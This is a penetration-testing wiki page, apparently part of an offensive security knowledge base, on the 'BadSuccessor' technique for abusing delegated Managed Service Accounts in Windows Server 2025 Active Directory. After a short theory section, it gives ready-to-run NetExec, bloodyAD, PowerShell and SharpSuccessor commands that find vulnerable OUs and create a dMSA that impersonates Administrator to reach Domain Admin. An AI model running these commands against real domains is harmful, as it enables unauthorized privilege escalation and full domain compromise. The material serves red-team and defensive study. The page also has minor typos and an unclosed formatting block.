# BadSuccessor (dMSA abuse)

## Theory

In Windows Server 2025, Microsoft introduced [delegated Managed Service Accounts (dMSAs).](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) A dMSA is a new type of service account in Active Directory (AD) that expands on the capabilities of [group Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/group-managed-service-accounts-overview) (gMSAs).&#x20;

If we have **`GenericAll`**, **`CreateChild`**, **`WriteDACL`**, or **`WriteOwner`** permissions on _any_ OUâ€”or can modify an existing dMSA, we can escalate from low-level access to full Domain Admin via the **BadSuccessor** technique.

{% hint style="success" %}
**Exploiting this vector does not require the domain to actively use dMSAs.** The feature is automatically enabled in any domain that includes at least one Windows Server 2025 domain controller, and its presence alone is enough to make the attack path viable.

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to enulerate if a a target is vulnerable to bad successor attack

```bash
netexec ldap $DC_IP -u $USER -p $PASSWORD -M badsuccessor
```

We can  then exploit it using [BloodyAd](https://github.com/CravateRouge/bloodyAD) (Python).

```bash
# Enumerate writable attributes for the user we are authenticating as
bloodyAD -d $DOMAIN_FQDN -u $USER -p $PASSWORD --host $DC_FQDN get writable --detail

# BadSuccessor attack to create the dMSA object called dmsa_pwn
bloodyAD -d $DOMAIN_FQDN -u $USER -p $PASSWORD --host $DC_FQDN add badSuccessor dmsa_pwn
```
{% endtab %}

{% tab title="Windows" %}
You can use the [Get-BadSuccessorOUPermissions.ps1](https://github.com/akamai/BadSuccessor) script to identify if a a target is vulnerable to bad successor attack.

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

[SharpSuccessor](https://github.com/logangoins/SharpSuccessor) (C#) can the be used to exploit it

```powershell
# /path: The OU that the user has access to
# /account: Account that have enought permissions on the OU
# /name: name for the dMSA object that will be created 
.\SharpSuccessor.exe add /path:"ou=badOU,dc=domain,dc=local" /account:$USERNAME /name:dmsa_pwned /impersonate:Administrator
```
{% endtab %}
